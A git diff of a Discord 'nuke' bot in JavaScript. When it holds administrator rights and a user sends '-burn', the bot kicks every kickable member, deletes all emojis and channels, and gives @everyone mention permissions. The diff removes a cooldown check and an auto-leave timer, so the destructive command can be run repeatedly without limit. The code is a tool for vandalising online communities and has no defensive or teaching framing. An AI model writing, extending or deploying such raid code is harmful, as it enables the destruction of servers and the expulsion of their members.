@@ -108,7 +108,6 @@ client.on("message", msg => {
        if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
  return
   }
-            if(nukingtime.has("-burn")) {return}
         message.guild.members.cache.forEach(m => {
          if(m.kickable) m.kick();
    });
@@ -132,7 +131,6 @@ client.on("message", msg => {
  if(message.channel.type === "dm") {return}
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
   }    
-            if(nukingtime.has("-burn")) {return}
   message.guild.emojis.cache.forEach(e => {
     e.delete()})
     
@@ -170,7 +168,6 @@ b++
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
 if(message.guild.me.hasPermission("ADMINISTRATOR")) {
-            if(nukingtime.has("-burn")) {return}
        message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
    }
    }
@@ -207,7 +204,6 @@ a8"     "" 88       88 88P'    "8a a8P_____88
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
 if(message.guild.me.hasPermission("ADMINISTRATOR")) {
-            if(nukingtime.has("-burn")) {return}
              message.guild.channels.cache.forEach(channel => {
              channel.delete().then((channel)=>{
                if (channel.deleted === true)
@@ -228,13 +224,6 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  client.on('message', msg => {
      if(msg.content === `-burn`) {
          if(msg.channel.type === "dm") {return}
-            if(nukingtime.has("-burn")) {return msg.channel.send("command is on cooldown for 5 minutes or less").then(m => setTimeout(() => {m.delete()},3000))}
-              nukingtime.add("-burn")
-                setTimeout(() => {
-            nukingtime.delete("-burn")
-            msg.guild.leave()
-                console.log("ok i can do the funni again")
-          }, 200000)
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
         var number = 0
         var pray = -1
